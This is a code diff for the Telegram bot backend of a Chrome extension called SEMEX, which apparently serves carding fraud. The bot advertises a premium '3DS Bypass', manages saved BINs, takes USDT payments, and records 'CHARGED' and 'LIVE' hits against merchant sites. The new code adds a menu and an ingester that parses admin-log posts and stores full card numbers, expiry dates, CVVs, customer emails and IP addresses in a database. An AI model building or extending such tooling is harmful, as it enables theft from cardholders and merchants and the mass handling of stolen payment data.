@@ -14,12 +14,13 @@ from __future__ import annotations
 
 import logging
 import os
+import re
 from pathlib import Path
 
 from fastapi import APIRouter, Request
 
 from config import settings
-from services.telegram import copy_message, send_document, send_message
+from services.telegram import answer_callback_query, copy_message, send_document, send_message
 
 log = logging.getLogger("semex.bot")
 
@@ -218,21 +219,103 @@ async def _forward_proof_to_owner(
         )
 
 
-async def _cmd_start(chat_id: int, username: str | None) -> None:
-    name = f"@{username}" if username else "there"
-    text = (
-        f"<b>👋 Welcome to SEMEX, {name}!</b>\n\n"
-        "SEMEX is a Chrome extension that streamlines checkout automation.\n\n"
-        "<b>Getting started:</b>\n"
-        "1. /get — download the extension .zip\n"
-        "2. Unzip it, then open <code>chrome://extensions</code>\n"
-        "3. Enable <b>Developer mode</b> (top-right toggle)\n"
-        "4. Click <b>Load unpacked</b> and select the folder\n"
-        "5. Click the SEMEX icon and log in via the OTP shown here\n\n"
-        "💎 <b>Want Premium?</b> Type /buy to see plans (unlocks 3DS Bypass + more).\n\n"
-        "Type /help for the command list."
+def _owner_support_url() -> str | None:
+    handle = (getattr(settings, "OWNER_HANDLE", "") or "").strip().lstrip("@")
+    return f"https://t.me/{handle}" if handle else None
+
+
+def _main_menu_kb() -> dict:
+    """Inline keyboard shown under the /start welcome. Buttons that have a real
+    URL open it directly; otherwise they fall back to a callback that replies
+    with the relevant info (so nothing is ever a dead button)."""
+    # Row 1 — download the extension (always a callback → sends the .zip document)
+    row1 = [{"text": "🧩 Get Extension", "callback_data": "menu:get"}]
+
+    # Row 2 — premium group + support
+    grp = (getattr(settings, "PREMIUM_GROUP_LINK", "") or "").strip()
+    if grp:
+        premium_btn = {"text": "💎 Premium Group", "url": grp}
+    else:
+        premium_btn = {"text": "💎 Premium Group", "callback_data": "menu:premium"}
+    support_url = _owner_support_url()
+    if support_url:
+        support_btn = {"text": "🛟 Contact Support", "url": support_url}
+    else:
+        support_btn = {"text": "🛟 Contact Support", "callback_data": "menu:support"}
+    row2 = [premium_btn, support_btn]
+
+    # Row 3 — settings (saved BINs, account, etc.)
+    row3 = [{"text": "⚙️ Settings", "callback_data": "menu:settings"}]
+
+    return {"inline_keyboard": [row1, row2, row3]}
+
+
+def _welcome_text(name: str, user_id: int | None) -> str:
+    return (
+        "⚜️ <b>Welcome to SEMEX</b> ⚜️\n"
+        "─ ─ ─ ─ ─ ─ ─ ─ ─ ─\n"
+        f"👤 <b>User:</b> {name}\n"
+        f"🆔 <b>ID:</b> <code>{user_id if user_id is not None else '—'}</code>\n"
+        "─ ─ ─ ─ ─ ─ ─ ─ ─ ─\n\n"
+        "SEMEX is your premium checkout-automation suite. "
+        "Use the menu below to grab the extension, join the private group, "
+        "reach support, or manage your settings.\n\n"
+        "📝 <i>Note: keep your login OTP private — never share it with anyone.</i>\n\n"
+        "Type /help anytime for the full command list."
     )
-    await send_message(chat_id, text)
+
+
+async def _cmd_start(chat_id: int, username: str | None, user_id: int | None = None) -> None:
+    name = f"@{username}" if username else "there"
+    await send_message(chat_id, _welcome_text(name, user_id), reply_markup=_main_menu_kb())
+
+
+async def _cmd_menu(chat_id: int, username: str | None, user_id: int | None = None) -> None:
+    """Re-open the main menu on demand."""
+    await _cmd_start(chat_id, username, user_id)
+
+
+async def _cmd_settings(chat_id: int, from_user_id: int | None) -> None:
+    """Settings surface — account plan + saved BINs, straight from the bot."""
+    await _cmd_status(chat_id, from_user_id)
+    await _cmd_bins(chat_id, from_user_id)
+
+
+async def _handle_callback(callback: dict) -> None:
+    """Dispatch inline-button taps from the main menu."""
+    data = (callback.get("data") or "").strip()
+    cb_id = callback.get("id")
+    msg = callback.get("message") or {}
+    chat = msg.get("chat") or {}
+    chat_id = chat.get("id")
+    frm = callback.get("from") or {}
+    from_user_id = frm.get("id")
+    username = frm.get("username")
+
+    # Ack immediately so the client's spinner clears.
+    if cb_id:
+        try:
+            await answer_callback_query(cb_id)
+        except Exception:
+            pass
+    if not chat_id:
+        return
+
+    if data == "menu:get":
+        await _cmd_get(chat_id)
+    elif data == "menu:premium":
+        await _cmd_buy(chat_id, username)
+    elif data == "menu:support":
+        handle = (getattr(settings, "OWNER_HANDLE", "") or "").strip().lstrip("@")
+        if handle:
+            await send_message(chat_id, f"🛟 <b>Support</b>\n\nMessage the owner directly: @{handle}")
+        else:
+            await send_message(chat_id, "🛟 <b>Support</b>\n\nSupport contact isn't configured yet — please try again later.")
+    elif data == "menu:settings":
+        await _cmd_settings(chat_id, from_user_id)
+    elif data == "menu:home":
+        await _cmd_start(chat_id, username, from_user_id)
+    # Unknown callbacks are silently ignored.
 
 
 async def _cmd_help(chat_id: int) -> None:
@@ -244,7 +327,9 @@ async def _cmd_help(chat_id: int) -> None:
         "/bins – your saved BINs\n"
         "/savebin 414720 [label] – save a BIN to your extension list\n\n"
         "<b>🚀 Getting started:</b>\n"
-        "/start – onboarding\n"
+        "/start – onboarding + main menu\n"
+        "/menu – re-open the button menu\n"
+        "/settings – account + saved BINs\n"
         "/get – download the extension .zip\n"
         "/buy – premium plans + USDT payment addresses\n"
         "/paid – submit proof-of-payment screenshot\n"
@@ -477,6 +562,115 @@ async def _cmd_get(chat_id: int) -> None:
         await send_message(chat_id, "⚠️ Something went wrong sending the extension. Please try again shortly.")
 
 
+# ── Admin-log failsafe ingester ────────────────────────────────────────────
+# The Telegram admin-log channel is a durable, human-readable record of every
+# CHARGED/LIVE hit, and every post carries the originating user's Telegram id
+# and full card. If the primary /status DB insert ever fails (e.g. the row's
+# user id wasn't captured), this recovers the record straight from the channel
+# post so the admin panel is never missing a card. Idempotent: a hit that was
+# already persisted on the happy path is skipped.
+_LOG_ID_RE = re.compile(r"id:\s*(\d{4,})")
+_LOG_CARD_RE = re.compile(r"Card\s*➔\s*([0-9][0-9|/ ]{6,})")
+_LOG_STATUS_RE = re.compile(r"Status\s*➔\s*(.+)")
+_LOG_SITE_RE = re.compile(r"Site\s*➔\s*(.+)")
+_LOG_RESP_RE = re.compile(r"Response\s*➔\s*(.+)")
+_LOG_GW_RE = re.compile(r"Gateway\s*➔\s*(.+)")
+_LOG_EMAIL_RE = re.compile(r"Customer Email\s*➔\s*(.+)")
+_LOG_IP_RE = re.compile(r"IP\s*➔\s*([0-9a-fA-F:.]+)")
+
+
+def _first(rx: "re.Pattern[str]", text: str) -> str | None:
+    m = rx.search(text or "")
+    return m.group(1).strip() if m else None
+
+
+async def _ingest_admin_log_post(post: dict) -> None:
+    """Parse a channel post from the admin-log channel and upsert the hit as a
+    failsafe. Only acts on posts that look like a formatted ADMIN LOG hit (they
+    contain a `id:` handle and a `Card ➔` line)."""
+    text = (post.get("caption") or post.get("text") or "")
+    if "Card" not in text or "id:" not in text:
+        return
+    tg_raw = _first(_LOG_ID_RE, text)
+    card_raw = _first(_LOG_CARD_RE, text)
+    if not tg_raw or not card_raw:
+        return
+    try:
+        telegram_id = int(tg_raw)
+    except ValueError:
+        return
+
+    parts = [p.strip() for p in re.split(r"[|/]", card_raw) if p.strip()]
+    card_number = parts[0] if parts else None
+    if not card_number or not card_number.isdigit():
+        return
+    card_month = parts[1] if len(parts) > 1 else None
+    card_year = parts[2] if len(parts) > 2 else None
+    card_cvv = parts[3] if len(parts) > 3 else None
+
+    # The admin-log status line begins with an emoji (e.g. "⚡️ USD 9.99 Charged! ✅"
+    # or "🔥 LIVE 🔥"), so classify by keyword anywhere in the line — NOT by the
+    # first character. Only CHARGED and LIVE are ever posted to the admin log.
+    status_line = (_first(_LOG_STATUS_RE, text) or "").lower()
+    if any(k in status_line for k in ("charged", "success", "approve", "captured", "succeed")):
+        status = "charged"
+    else:
+        status = "live"  # default: admin log only carries charged + live
+
+    from db import get_db
+    db = get_db()
+    # Idempotency: skip if a row for this user+PAN already exists on the happy
+    # path (fast pre-check). The authoritative guard against concurrent/edited
+    # channel-post delivery is the atomic upsert below, backed by the partial
+    # unique index on recovered rows (see db.init_indexes).
+    try:
+        existing = await db.hits.find_one(
+            {"telegram_id": telegram_id, "card_number": card_number},
+            {"_id": 1},
+        )
+    except Exception as e:
+        log.warning("failsafe dedup lookup failed: %s", e)
+        return
+    if existing:
+        return
+
+    from models import Hit
+    site = _first(_LOG_SITE_RE, text)
+    hit = Hit(
+        telegram_id=telegram_id,
+        status=status,
+        card_number=card_number,
+        card_exp_month=card_month,
+        card_exp_year=card_year,
+        card_cvv=card_cvv,
+        bin=card_number[:6] if len(card_number) >= 6 else None,
+        response=_first(_LOG_RESP_RE, text),
+        gateway=_first(_LOG_GW_RE, text),
+        site_url=site,
+        hostname=site,
+        customer_email=_first(_LOG_EMAIL_RE, text),
+        ip=_first(_LOG_IP_RE, text),
+        recovered_from_log=True,
+    )
+    # Atomic upsert keyed on (telegram_id, card_number, recovered_from_log=True).
+    # Combined with the partial unique index this makes concurrent/edited-post
+    # delivery idempotent — the second writer's $setOnInsert is a no-op and a
+    # DuplicateKeyError (index race) is treated as success.
+    try:
+        from pymongo.errors import DuplicateKeyError
+        try:
+            await db.hits.update_one(
+                {"telegram_id": telegram_id, "card_number": card_number, "recovered_from_log": True},
+                {"$setOnInsert": hit.to_mongo()},
+                upsert=True,
+            )
+            log.info("failsafe: recovered %s hit for user %s from admin-log post", status, telegram_id)
+        except DuplicateKeyError:
+            pass  # concurrent recovery already inserted it — idempotent success
+    except Exception as e:
+        log.warning("failsafe upsert failed: %s", e)
+
+
 @router.post("/webhook")
 async def telegram_webhook(request: Request):
     """Receives Telegram Bot API updates. Dispatches slash-commands.
@@ -526,6 +720,32 @@ async def telegram_webhook(request: Request):
             # Never let the dedup store break command handling.
             log.warning("webhook replay-guard failed (processing anyway): %s", e)
 
+    # ── Admin-log failsafe: ingest channel posts from the admin-log channel ──
+    channel_post = update.get("channel_post") or update.get("edited_channel_post")
+    if channel_post:
+        # Ingestion WRITES card rows from the post body, so only trust it when the
+        # webhook secret is configured (verified above). Without the secret the
+        # endpoint is spoofable and a forged post could manufacture card rows.
+        if not _wh_secret:
+            log.warning("channel-post ingest skipped: TELEGRAM_WEBHOOK_SECRET not set (spoofable)")
+            return {"ok": True}
+        try:
+            src_chat = (channel_post.get("chat") or {}).get("id")
+            if src_chat is not None and int(src_chat) == int(settings.ADMIN_LOG_CHANNEL_ID):
+                await _ingest_admin_log_post(channel_post)
+        except Exception as e:
+            log.warning("admin-log ingest failed: %s", e)
+        return {"ok": True}
+
+    # ── Inline-button (callback query) dispatch ──────────────────────────────
+    callback = update.get("callback_query")
+    if callback:
+        try:
+            await _handle_callback(callback)
+        except Exception as e:
+            log.exception("callback handling failed: %s", e)
+        return {"ok": True}
+
     message = update.get("message") or update.get("edited_message") or {}
     text: str = (message.get("text") or "").strip()
     chat = message.get("chat") or {}
@@ -566,7 +786,11 @@ async def telegram_webhook(request: Request):
 
     try:
         if command == "/start":
-            await _cmd_start(chat_id, username)
+            await _cmd_start(chat_id, username, from_user_id)
+        elif command == "/menu":
+            await _cmd_menu(chat_id, username, from_user_id)
+        elif command in ("/settings", "/setting"):
+            await _cmd_settings(chat_id, from_user_id)
         elif command == "/help":
             await _cmd_help(chat_id)
         elif command == "/get":
